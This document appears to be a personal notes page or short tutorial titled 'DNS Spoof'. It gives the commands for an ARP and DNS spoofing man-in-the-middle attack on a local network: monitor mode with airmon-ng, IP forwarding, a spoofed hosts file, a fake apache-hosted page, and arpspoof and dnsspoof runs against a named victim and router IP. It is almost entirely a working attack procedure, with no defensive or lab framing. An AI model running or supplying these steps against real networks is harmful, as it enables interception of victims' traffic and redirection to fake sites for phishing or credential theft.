# DNS Spoof

```bash
rfkill unblock all && airmon-ng check kill && airmon-ng start wlan0
```

* Install if not already installed

#### Lets our computer act as a bridge and forward packets based on MAC rather than IP \(like a router\) \#\#\#

```text
apt-get install bridge-utils
```

* Enable IP forwarding

#### Lets us determine the path where packets are sent, usually used by routers to decide which network to send data to \(do this every time\)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

* Create DNS host file
* We will create a fake DNS response
* When the user asks for the IP of "bacon.com", we will give them our IP

Our actual IP = **192.168.0.11**

* Desktop/spoofhosts.txt

192.168.0.11 www\* 192.168.0.11 bacon.com

### Make fake website and start server

To host file on own computer, create and save index.html to var/www/html/

```html
<html>
<body>
    <h1>Some fake webpage</h1>
</body>
</html>
```

- Start apache

```bash
apache2ctl start
```

- Start ARP and DNS spoofing

We will constantly send the victim computer ARP answers telling him that the MAC address belonging to the IP of the router is our MAC address.

* Tell the victim that our IP address is the routers
* Also tell the router that we are the victims IP

Victims IP = 192.168.0.17 Router = 192.168.0.1

* New terminal for each

```bash
arpspoof -t 192.168.0.17 192.168.0.1 && arpspoof -t 192.168.0.1 192.168.0.17
dnsspoof -f Desktop/spoofhosts.txt host 192.168.0.17 and udp port 53
```